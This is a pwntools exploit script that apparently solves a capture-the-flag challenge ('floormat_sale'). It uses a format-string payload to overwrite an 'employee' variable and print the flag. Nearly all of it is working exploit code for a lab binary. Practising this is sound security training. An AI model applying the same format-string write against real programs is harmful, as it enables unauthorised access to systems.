from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDB script below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # Remote execution
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Local execution
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *employee_access
continue
'''

# Set up pwntools for the correct architecture
exe = './floormat_sale'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# Address of the 'employee' variable
employee_addr = elf.symbols['employee']
info(f"Employee variable address: {hex(employee_addr)}")

# Manually set the format string offset
offset = 10
info(f"Using format string offset: {offset}")

# Craft the payload to overwrite 'employee' variable
# We include the address of 'employee' in the payload
# Then use %<offset>$n to write to that address

# Since the address needs to be on the stack, we place it appropriately
payload = fmtstr_payload(offset, {employee_addr: 1}, write_size='int')

# Start the program
io = start(level='warn')

# Send the choice (option 6)
io.sendlineafter(b'Enter your choice:', b'6')

# Wait for the shipping address prompt
io.recvuntil(b'Please enter your shipping address:')

# Send the payload
io.sendline(payload)

# Receive the output to synchronize
io.recvuntil(b'Your floor mat will be shipped to:')

# Receive and print the flag
io.recvuntil(b'Exclusive Employee-only Mat will be delivered to: ')
flag = io.recvline()
success(f'Flag: {flag.decode()}')
